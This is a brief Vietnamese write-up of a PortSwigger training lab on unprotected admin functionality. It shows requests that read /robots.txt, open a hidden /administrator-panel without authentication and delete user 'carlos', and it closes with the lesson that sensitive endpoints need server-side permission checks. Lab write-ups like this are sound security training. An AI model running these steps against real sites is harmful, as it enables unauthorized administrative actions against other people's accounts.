![[idor-admin-panel.png]]
-mô tả lab: trang admin không hề check quyền. Mình đọc `/robots.txt` là thấy đường dẫn.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality

### hướng giải
- [ ] mình GET `/robots.txt`, sau đó quan sát gói tin trả về, mình thấy `Disallow: /administrator-panel`
- [ ] mình GET `/administrator-panel`, mình thấy vào luôn không hỏi gì
- [ ] => trong panel có nút delete carlos, mình click là solve

### giải
```
GET /robots.txt -> 200, body: User-agent: * / Disallow: /administrator-panel
GET /administrator-panel -> 200 admin panel
GET /administrator-panel/delete?username=carlos -> 302, carlos bay màu
```
![[idor-admin-delete.png]]

> [!NOTE]
> -bài học của mình: đừng giấu admin bằng robots/URL lạ. Mọi endpoint nhạy cảm đều phải check quyền ở server.
